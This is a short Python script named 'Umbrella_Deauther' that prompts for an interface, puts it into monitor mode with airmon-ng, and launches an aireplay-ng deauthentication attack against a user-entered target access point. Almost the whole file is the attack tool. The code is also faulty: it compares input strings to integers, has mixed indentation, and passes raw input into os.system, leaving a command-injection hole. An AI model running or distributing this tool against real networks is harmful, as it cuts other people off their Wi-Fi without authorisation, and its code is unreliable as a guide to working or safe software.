import os 


print('################################<Umbrella_Deauther>###################################')

print('1 means yes/ 2 means no')

print('Do you want to see your interfaces?[1/2]')

ifc = input(': ')

if ifc == 1:
	os.system('ifconfig')

print('Do you want to start monitor mode?[1/2]')

start = input(': ')
if start == 1:
	print('Enter the interface please with \' for usage: \'wlan\'')
	mon = input(': ')
        print('Do you want to chose channel?[1/2]')
	choose = input(': ')
	if choose == 1:
		channel = input('ch: ')
		os.system('sudo airmon-ng start ' + mon + ' ' + channel)
	os.system('sudo airmon-ng start ' + mon )

print('ENTER PARAMETERS FOR DEAUTH with \'\' ')
interface = input ('iface: ')
pak = input('packets:  ')
targ = input('target: ')

os.system('aireplay-ng -0 ' + pak + ' -a ' + targ + ' ' + interface)

